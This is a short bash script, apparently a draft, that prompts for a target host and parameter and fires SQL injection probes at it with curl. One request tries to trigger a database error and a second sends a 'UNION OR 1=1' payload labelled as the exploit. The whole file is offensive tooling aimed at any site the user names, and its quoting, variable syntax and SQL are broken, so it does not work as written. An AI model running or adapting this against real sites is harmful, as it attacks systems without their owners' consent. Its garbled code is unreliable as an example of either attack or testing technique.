#!/bin/bash
# This is a script that is made to automate mysql injections
# To be modified later

echo "Enter the host info (ip/domain)" 
read host
echo "Submit the the vulnerable/suspected parameter"
read p
# Triggering an error
curl "$host/index.php?{$p}=' "' %'-- -"" | grep error

# The Exploit
curl "{$host}/index.php?{$p}=' UNION OR 1=1;-- -"
